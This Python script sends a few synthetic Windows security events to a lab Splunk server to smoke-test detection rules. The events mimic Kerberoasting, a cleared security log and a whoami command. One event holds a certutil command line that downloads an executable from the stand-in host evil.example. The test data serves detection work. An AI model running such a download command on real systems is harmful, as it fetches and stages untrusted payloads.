#!/usr/bin/env python3
"""Send a handful of synthetic Windows events to the lab Splunk via HEC.

A quick smoke test of the whole loop (Splunk + HEC + run_rule.py) without needing
a multi-hundred-MB EVTX download. For REAL testing, use fetch_samples.sh +
ingest_evtx.py.

    pip install requests
    python send_sample_events.py
"""
import os
import json
import time

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HEC_URL = os.environ.get("SPLUNK_HEC_URL", "https://localhost:8088/services/collector/event")
HEC_TOKEN = os.environ.get("SPLUNK_HEC_TOKEN", "tdl-hec-token-0000000000")
now = time.time()

EVENTS = [
    # Kerberoasting — 4769 with RC4 encryption (0x17), used by TDL-CA-000019
    {"sourcetype": "WinEventLog:Security", "event": {
        "EventCode": "4769", "EventID": "4769", "event_id": "4769",
        "Account_Name": "svc_sql@CORP.LOCAL", "Service_Name": "MSSQLSvc",
        "Ticket_Encryption_Type": "0x17", "Failure_Code": "0x0",
        "Client_Address": "10.0.0.55", "Computer": "DC01.corp.local", "host": "DC01"}},
    # Repeated 4769 to exceed thresholds
    {"sourcetype": "WinEventLog:Security", "event": {
        "EventCode": "4769", "EventID": "4769", "event_id": "4769",
        "Account_Name": "svc_sql@CORP.LOCAL", "Service_Name": "HTTP",
        "Ticket_Encryption_Type": "0x17", "Failure_Code": "0x0",
        "Client_Address": "10.0.0.55", "Computer": "DC01.corp.local", "host": "DC01"}},
    # Security log cleared — 1102
    {"sourcetype": "WinEventLog:Security", "event": {
        "EventCode": "1102", "EventID": "1102", "event_id": "1102",
        "Account_Name": "administrator", "Computer": "WIN10-01.corp.local", "host": "WIN10-01"}},
    # Process creation — 4688 (certutil download)
    {"sourcetype": "WinEventLog:Security", "event": {
        "EventCode": "4688", "EventID": "4688", "event_id": "4688",
        "New_Process_Name": "C:\\Windows\\System32\\certutil.exe",
        "Process_Command_Line": "certutil.exe -urlcache -f http://evil.example/a.exe a.exe",
        "Account_Name": "jdoe", "Computer": "WIN10-01.corp.local", "host": "WIN10-01"}},
    # Sysmon process create — EventID 1
    {"sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "event": {
        "EventCode": "1", "EventID": "1", "event_id": "1",
        "Image": "C:\\Windows\\System32\\cmd.exe",
        "CommandLine": "cmd.exe /c whoami", "User": "CORP\\jdoe",
        "Computer": "WIN10-01.corp.local", "host": "WIN10-01"}},
]

body = "".join(json.dumps({"index": "main", "sourcetype": e["sourcetype"],
                           "source": "tdl-lab:sample", "time": now, "event": e["event"]}) + "\n"
               for e in EVENTS)
r = requests.post(HEC_URL, headers={"Authorization": f"Splunk {HEC_TOKEN}"},
                  data=body, verify=False, timeout=30)
print(f"HEC {r.status_code}: {r.text[:160]}")
print(f"Sent {len(EVENTS)} sample events. Try:  python run_rule.py TDL-CA-000019")
